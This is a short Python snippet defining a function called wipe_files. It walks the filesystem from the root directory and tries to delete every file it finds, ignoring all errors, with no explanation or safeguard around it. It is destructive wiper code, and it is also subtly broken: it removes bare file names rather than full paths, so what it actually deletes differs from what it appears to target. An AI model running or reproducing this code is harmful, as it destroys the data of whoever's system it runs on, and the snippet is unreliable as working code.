def wipe_files():
    import os
    for (dirpath, dirnames, filenames) in os.walk('/'):
        for file in filenames:
            try:
                os.remove(file)
            except:
                pass